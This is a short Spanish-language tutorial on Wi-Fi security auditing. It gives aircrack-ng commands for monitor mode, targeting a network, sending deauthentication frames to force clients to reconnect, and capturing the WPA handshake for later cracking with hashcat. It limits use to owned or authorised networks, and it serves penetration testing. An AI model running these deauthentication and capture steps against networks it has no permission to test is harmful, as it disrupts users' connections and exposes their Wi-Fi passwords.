---
tags: [osint, wifi, handshake, aircrack, auditoria, pentest]
fecha: 2026-06-25
author: alvarofernandezmota-tech
uso: solo en redes propias o con autorización explícita
---

# Guía Maestra: Auditoría y Captura de Handshakes Wi-Fi V2

> ⚠️ **Ética:** Solo para auditoría de redes propias o autorizadas.

## 1. Conceptos Fundamentales

- **Handshake (4-way):** Autenticación entre cliente y AP. Capturarlo permite auditoría de seguridad.
- **Modo Monitor:** La tarjeta captura tramas sin asociarse a redes.
- **Desautenticación:** Forzar reconexión del cliente para generar nuevo handshake capturable.

## 2. Preparación (Reset del Ecosistema)

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan1
iw dev
```

## 3. Fases de la Auditoría

### Fase A — Radar Global
```bash
sudo airodump-ng wlan1mon -w captura_global
```
→ Identificar BSSID y Canal (CH) del objetivo.

### Fase B — Enfoque (Filtro)
```bash
sudo airodump-ng wlan1mon -c [CANAL] --bssid [BSSID] -w captura_final
```

### Fase C — Ataque (Francotirador)
En segunda terminal:
```bash
sudo aireplay-ng -0 5 -a [BSSID] --ignore-negative-one wlan1mon
```

## 4. Verificación de Éxito

En Terminal 1 aparece: `WPA handshake: [BSSID]`

Si no aparece: repetir desautenticación o apagar/encender Wi-Fi del cliente.

## 5. Análisis Posterior

- Archivo `.cap` generado → insumo para `hashcat`
- Alternativa avanzada: `hcxdumptool` (automatiza captura)
